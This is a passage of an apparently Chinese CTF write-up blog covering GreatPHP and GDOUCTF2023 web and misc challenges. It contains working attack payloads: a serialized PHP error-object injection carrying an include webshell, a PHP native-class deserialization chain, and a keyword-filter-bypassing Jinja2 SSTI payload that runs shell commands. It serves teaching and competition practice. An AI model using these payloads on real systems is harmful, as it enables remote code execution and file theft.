class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lover%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A24%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude+%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span><span class="hljs-keyword">string</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A87%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>CApplications%<span class="hljs-number">5</span>CCTF%<span class="hljs-number">5</span>Cphpstudy_pro%<span class="hljs-number">5</span>CWWW%<span class="hljs-number">5</span>CCTF%<span class="hljs-number">5</span>Cbuuctf%<span class="hljs-number">5</span>Cweb4%<span class="hljs-number">5</span>C%<span class="hljs-number">5</span>B%E6%<span class="hljs-number">9</span>E%<span class="hljs-number">81</span>%E5%AE%A2%E5%A4%A7%E6%<span class="hljs-number">8</span>C%<span class="hljs-number">91</span>%E6%<span class="hljs-number">88</span>%<span class="hljs-number">98</span>+<span class="hljs-number">2020</span>%<span class="hljs-number">5</span>DGreatphp.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/29/iAF9arPTCd67lfV.png" alt="image-20230529121057559"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Greatphp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDOUCTF</title>
    <link href="/2023/08/24/GDOUCTF/"/>
    <url>/2023/08/24/GDOUCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="【GDOUCTF2023】"><a href="#【GDOUCTF2023】" class="headerlink" title="【GDOUCTF2023】"></a>【GDOUCTF2023】</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h4><p>js小游戏，玩游戏得到flag，修改一下js源码</p><h4 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h4><p>访问 <code>/super-secret-route-nobody-will-guess</code> 发送PUT请求：</p><p><img src="https://s2.loli.net/2023/04/17/XSCRlnGgI3aY6cJ.png" alt="image-20230417113605674"></p><h4 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]==<span class="hljs-string">&#x27;j0k3r&#x27;</span>)&#123;<br>               <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>]))&#123;<br>                  <span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br>                  <span class="hljs-variable">$bbb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>];<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$bbb</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$aaa</span>!=<span class="hljs-variable">$bbb</span>)&#123;<br>                   <span class="hljs-variable">$give</span> = <span class="hljs-string">&#x27;cancanwordflag&#x27;</span>;<br>                   <span class="hljs-variable">$get</span> =<span class="hljs-string">&#x27;hacker!&#x27;</span>;<br>                   <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>                         <span class="hljs-keyword">die</span>(<span class="hljs-variable">$give</span>);<br>                    &#125;<br>                   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>                       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$get</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>                   &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                         <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>                    &#125;<br>                   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;洗洗睡吧&quot;</span>;<br>                 &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;行不行啊细狗&quot;</span>;<br>        &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;菜菜&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;就这?&quot;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;别来沾边&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/17/64btMXUOYSkJPsm.png" alt="image-20230417115149827"></p><h4 id="泄露的伪装"><a href="#泄露的伪装" class="headerlink" title="泄露的伪装"></a>泄露的伪装</h4><p>​源码泄露</p><p><img src="https://s2.loli.net/2023/04/17/oLUaI74JVpsYxAq.png" alt="image-20230417115405834"></p><p><a href="http://www.rar/">www.rar</a>:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">恭喜你<br>turn <span class="hljs-keyword">to</span><br><br>/orzorz.php<br></code></pre></td></tr></table></figure><p>访问，php伪协议：</p><p><img src="https://s2.loli.net/2023/04/17/OTfJvpyuZGHLSlB.png" alt="image-20230417115710043"></p><h4 id="反方向的钟"><a href="#反方向的钟" class="headerlink" title="反方向的钟"></a>反方向的钟</h4><p>php原生类反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br><br>&#125;<br><br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$s</span>-&gt;headmaster = <span class="hljs-string">&quot;ong&quot;</span>;<br><span class="hljs-variable">$s</span>-&gt;department = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;name = <span class="hljs-string">&quot;one class&quot;</span>;<br><span class="hljs-variable">$c</span>-&gt;leader = <span class="hljs-variable">$t</span>;<br><span class="hljs-variable">$t</span>-&gt;name = <span class="hljs-string">&quot;ing&quot;</span>;<br><span class="hljs-variable">$t</span>-&gt;rank = <span class="hljs-string">&quot;department&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>));<br><br><br>输出：<br>Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7Tjt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9<br></code></pre></td></tr></table></figure><p>然后我们使用<strong>Directorylterator</strong>配合glob伪协议查看文件</p><p><img src="https://s2.loli.net/2023/04/17/GvSEamzRALX1hKN.png" alt="image-20230417121147338"></p><p>使用<code>SplFileObject</code>配合伪协议读取flag</p><p><img src="https://s2.loli.net/2023/04/17/Zim8qlFnXEae5Y9.png" alt="image-20230417121323373"></p><p><a href="https://zhuanlan.zhihu.com/p/458866772">php原生类</a></p><h4 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h4><p><img src="https://s2.loli.net/2023/04/27/Gs5huJVeHf9bkAg.png" alt="image-20230427214137805"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=<span class="hljs-number">1</span>,p=<span class="hljs-number">1</span>)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> x=(()|select|string|<span class="hljs-built_in">list</span>|attr(po)(<span class="hljs-number">24</span>)) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini=x~x~(<span class="hljs-built_in">dict</span>(init=<span class="hljs-number">1</span>)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> glob=x~x~(<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=<span class="hljs-number">1</span>)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> geti=x~x~(<span class="hljs-built_in">dict</span>(get=<span class="hljs-number">1</span>,item=<span class="hljs-number">1</span>)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> o=(<span class="hljs-built_in">dict</span>(o=<span class="hljs-number">1</span>,s=<span class="hljs-number">1</span>)|join) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c=(lipsum|attr(glob)|attr(geti))(o) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> buil=x~x~(<span class="hljs-built_in">dict</span>(buil=<span class="hljs-number">1</span>,tins=<span class="hljs-number">1</span>)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cc=(a|attr(ini)|attr(glob)|attr(geti))(buil) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> pope=(<span class="hljs-built_in">dict</span>(pope=<span class="hljs-number">1</span>,n=<span class="hljs-number">1</span>)|join) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> read=(<span class="hljs-built_in">dict</span>(read=<span class="hljs-number">1</span>)|join) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch=(<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">chr</span>=<span class="hljs-number">1</span>)|join) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=(cc|attr(geti))(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> file=<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)%2Bchr(<span class="hljs-number">97</span>)%2Bchr(<span class="hljs-number">116</span>)%2Bchr(<span class="hljs-number">32</span>)%2Bchr(<span class="hljs-number">47</span>)%2Bchr(<span class="hljs-number">102</span>)%2Bchr(<span class="hljs-number">108</span>)%2Bchr(<span class="hljs-number">97</span>)%2Bchr(<span class="hljs-number">103</span>) %&#125;<br>&#123;% <span class="hljs-built_in">print</span>(((c|attr(pope))(file))|attr(read))() %&#125;<br></code></pre></td></tr></table></figure><p>解法二：</p><p>使用工具 <a href="https://github.com/Marven11/Fenjing">fenjing </a></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">python3 -m fenjing scan --url &#x27;http://node2.anna.nssctf.cn:<span class="hljs-number">2812</span>9/&#x27;<br></code></pre></td></tr></table></figure><p>然后<code>cat /flag</code>即可</p><p><img src="https://s2.loli.net/2023/04/21/N5ReHwrc64klVfv.png" alt="image-20230421131742364"></p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h4><p>压缩包套娃</p><p>第一个压缩包密码为：63181528278494851</p><p>坑点1：<strong>从左到右计算</strong>，（先+后×），应该类似于数据结构中的  堆进行四则运算</p><p><img src="https://s2.loli.net/2023/04/17/CuIsTP8wnSXfqOD.png" alt="image-20230417194515779"></p><p>坑点2：</p><p>需要将0开头的数字中的这个0给去掉（并不是8进制）</p><p>坑点3：</p><p>如果最后结果为负数，需要取绝对值使之为正（zip996的密码：29041679）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 